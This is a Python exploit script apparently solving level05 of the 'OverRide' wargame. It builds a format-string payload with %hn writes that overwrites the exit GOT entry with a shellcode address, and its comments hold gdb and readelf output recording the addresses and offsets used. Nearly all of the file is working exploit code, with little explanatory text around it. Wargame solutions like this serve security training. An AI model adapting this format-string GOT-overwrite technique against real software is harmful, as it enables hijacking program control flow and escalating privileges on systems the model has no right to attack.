import struct

# level05@OverRide:~$ readelf --all level05 | grep exit
# 080497e0  00000407 R_386_JUMP_SLOT   00000000   exit
exit_got = 0x080497e0

# (gdb) r
# Starting program: /home/users/level05/level05 
# AAAA %x %x %x %x %x %x %x %x %x %x
# aaaa 64 f7fcfac0 f7ec3add ffffd63f ffffd63e 0 ffffffff ffffd6c4 0 61616161
# ...
# (gdb) x/20x $esp
# 0xffffd5f0:	0xffffd618	0x00000064	0xf7fcfac0	0xf7ec3add
# 0xffffd600:	0xffffd63f	0xffffd63e	0x00000000	0xffffffff
# 0xffffd610:	0xffffd6c4	0x00000000	0x61616161	0x20782520
buffer_start = 0xffffd618

# cat and exec main.c
shellcode_addr = 0xffffded6

#(gdb) x exit
# 0xf7e5eb70 <exit>:	0x71fde853
exit_code_addr = 0xf7e5eb70

# huge distance
# (gdb) p 0xffffded6-0xf7e5eb70
# $3 = 135918438
# so we had better write 4 bytes by 4 bytes
# (gdb) p/d 0xded6
# $7 = 57046
# (gdb) p/d 0xffff
# $8 = 65535

payload = struct.pack("<I", exit_got)
payload += struct.pack("<I", exit_got + 2)

# Write shellcode address to exit@got
high_bytes = (shellcode_addr >> 16) & 0xFFFF
low_bytes = (shellcode_addr) & 0xFFFF

# Check
print(low_bytes)
print(high_bytes)
print("------------------------")

# # first write

# payload_len = 8 # exit_got exit_got+2
# needed_len = low_bytes - payload_len
# print(needed_len) # get 57038 to write in the next line. For # shellcode 0xffffded6
# padding =  b"%57038x%10$hn" # 10th, cause we can see that the args starts at 10th of printf
# payload_len += len(padding)
# payload += padding

# # second write
# needed_len = high_bytes - low_bytes
# print(needed_len) # get 8489
# padding =  b"%8489x%11$hn"
# payload_len += len(padding)
# payload += padding

# easy way to overwrite the addr
payload += b"%%%dx%%10$hn" % (low_bytes - 8)
payload += b"%%%dx%%11$hn" % (high_bytes - low_bytes)
payload += b"\0"

print(payload)